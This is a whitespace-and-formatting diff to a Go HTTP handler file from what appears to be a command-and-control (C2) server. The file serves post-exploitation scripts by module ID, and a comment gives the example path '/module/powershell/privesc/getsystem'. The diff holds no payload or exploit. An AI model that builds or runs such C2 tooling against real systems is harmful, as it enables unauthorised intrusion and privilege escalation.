@@ -21,8 +21,8 @@ import (
 
 // Server handles C2 server operations
 type Server struct {
-	config       *core.Config
-	logger       interface {
+	config *core.Config
+	logger interface {
 		Info(string, ...interface{})
 		Debug(string, ...interface{})
 		Error(string, ...interface{})
@@ -85,7 +85,7 @@ func (s *Server) setupRoutes() {
 
 	// Result endpoint
 	s.handler.HandleFunc("/result", s.handleResult)
-	
+
 	// Module endpoint
 	s.handler.HandleFunc("/module/", s.handleModule)
 
@@ -301,38 +301,38 @@ func (s *Server) handleModule(w http.ResponseWriter, r *http.Request) {
 		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
 		return
 	}
-	
+
 	// Extract module ID from URL path (/module/powershell/privesc/getsystem)
 	moduleID := strings.TrimPrefix(r.URL.Path, "/module/")
 	if moduleID == "" {
 		http.Error(w, "Module ID required", http.StatusBadRequest)
 		return
 	}
-	
+
 	s.logger.Debug("Module request for %s from %s", moduleID, r.RemoteAddr)
-	
+
 	if s.moduleGetter == nil {
 		http.Error(w, "Module getter not configured", http.StatusInternalServerError)
 		return
 	}
-	
+
 	script, err := s.moduleGetter(moduleID)
 	if err != nil {
 		s.logger.Error("Failed to get module %s: %v", moduleID, err)
 		http.Error(w, fmt.Sprintf("Module not found: %s", moduleID), http.StatusNotFound)
 		return
 	}
-	
+
 	response := map[string]interface{}{
 		"script": script,
 	}
-	
+
 	w.Header().Set("Content-Type", "application/json")
 	if err := json.NewEncoder(w).Encode(response); err != nil {
 		s.logger.Error("Failed to encode module response: %v", err)
 		return
 	}
-	
+
 	s.logger.Debug("Module script sent for %s", moduleID)
 }
 
